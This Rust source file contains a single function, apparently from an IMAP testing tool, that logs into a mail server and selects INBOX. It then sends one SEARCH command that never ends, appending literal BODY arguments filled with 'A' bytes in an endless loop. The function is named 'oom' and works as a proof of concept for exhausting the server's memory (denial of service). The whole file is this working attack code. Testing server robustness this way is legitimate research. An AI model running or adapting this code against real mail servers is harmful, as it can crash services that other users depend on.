use imap_flow::{
    client::{ClientFlow, ClientFlowEvent, ClientFlowOptions},
    stream::AnyStream,
};
use imap_types::{
    command::{Command, CommandBody},
    mailbox::Mailbox,
    response::{Status, StatusBody, StatusKind, Tagged},
};
use log::info;
use tokio::{io::AsyncWriteExt, net::TcpStream};
use tracing::{error, warn};

pub(crate) async fn oom(host: &str, username: &str, password: &str, chunk_size: u32) {
    let (mut client, _) = ClientFlow::receive_greeting(
        AnyStream::new(TcpStream::connect(host).await.unwrap()),
        ClientFlowOptions::default(),
    )
    .await
    .unwrap();

    client.enqueue_command(
        Command::new(
            "A1",
            CommandBody::login(username.to_string(), password.to_string()).unwrap(),
        )
        .unwrap(),
    );

    loop {
        match client.progress().await.unwrap() {
            ClientFlowEvent::CommandSent { .. } => {}
            ClientFlowEvent::StatusReceived {
                status:
                    Status::Tagged(Tagged {
                        tag,
                        body: StatusBody { kind, .. },
                    }),
            } if tag.as_ref() == "A1" => {
                if kind == StatusKind::Ok {
                    client.enqueue_command(
                        Command::new(
                            "A2",
                            CommandBody::Select {
                                mailbox: Mailbox::Inbox,
                            },
                        )
                        .unwrap(),
                    );
                    break;
                }

                error!("LOGIN failed");
                return;
            }
            event => warn!(?event, "unexpected event"),
        }
    }

    loop {
        match client.progress().await.unwrap() {
            ClientFlowEvent::CommandSent { .. } => {}
            ClientFlowEvent::DataReceived { .. } => {}
            ClientFlowEvent::StatusReceived {
                status:
                    Status::Tagged(Tagged {
                        tag,
                        body: StatusBody { kind, .. },
                    }),
            } if tag.as_ref() == "A2" => {
                if kind == StatusKind::Ok {
                    break;
                }

                error!("SELECT failed");
                return;
            }
            ClientFlowEvent::StatusReceived { .. } => {}
            event => warn!(?event, "unexpected event"),
        }
    }

    client.stream_mut().0.write_all(b"A2 SEARCH").await.unwrap();

    let data = b"A".repeat(chunk_size as usize);

    loop {
        client
            .stream_mut()
            .0
            .write_all(format!(" BODY {{{}}}\r\n", chunk_size).as_bytes())
            .await
            .unwrap();

        loop {
            match client.progress().await.unwrap() {
                ClientFlowEvent::ContinuationReceived { .. } => {
                    info!("continuation received");

                    println!("Press ENTER to continue");
                    {
                        let mut line = String::new();
                        std::io::stdin().read_line(&mut line).unwrap();
                    }

                    client.stream_mut().0.write_all(&data).await.unwrap();
                    break;
                }
                event => warn!(?event, "unexpected event"),
            }
        }
    }
}
